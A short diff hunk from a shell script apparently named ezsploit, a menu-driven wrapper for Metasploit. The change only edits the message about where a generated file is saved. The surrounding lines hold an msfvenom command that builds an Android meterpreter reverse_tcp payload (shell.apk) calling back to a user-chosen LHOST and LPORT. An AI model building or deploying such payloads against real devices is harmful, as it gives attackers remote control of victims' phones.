@@ -88,7 +88,7 @@ do
         "Android")
             read -p 'Set LHOST IP: ' uservar; read -p 'Set LPORT: ' userport
             msfvenom -p android/meterpreter/reverse_tcp LHOST=$uservar LPORT=$userport R > ~/sdcard/ezsploit/shell.apk
-            echo -e "\E[1;33m::::: \e[97mshell.apk saved to ~/sdcard/ezsploit\E[1;33m:::::"
+            echo -e "\E[1;33m::::: \e[97mshell.apk saved to ~/root/sdcard/ezsploit\E[1;33m:::::"
             ;;  
         "List_All")
             xterm -e msvenom -l &
